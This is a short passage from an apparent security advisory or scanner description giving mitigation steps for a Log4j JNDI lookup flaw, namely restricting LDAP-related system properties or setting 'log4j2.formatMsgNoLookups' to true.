  Note: If version 2.15.0 is already installed please make sure to configure the following system
  properties accordingly (e.g. don't allow the use of the ldap protocol in JDNI Lookups, restrict
  access to ldap servers, ...):

  - log4j2.allowedJndiProtocols

  - log4j2.allowedLdapClasses

  - log4j2.allowedLdapHosts

  Mitigation: If updating to version 2.15.0 isn't possible but a version >= 2.10 is used this flaw
  can be mitigated by setting the system property 'log4j2.formatMsgNoLookups' to 'true'.

  Please refer to the Log4j manual for more information about the mentioned system properties and
  how to set them.

  External resources are also mentioning that Java 8u121 is protecting against this flaw.");
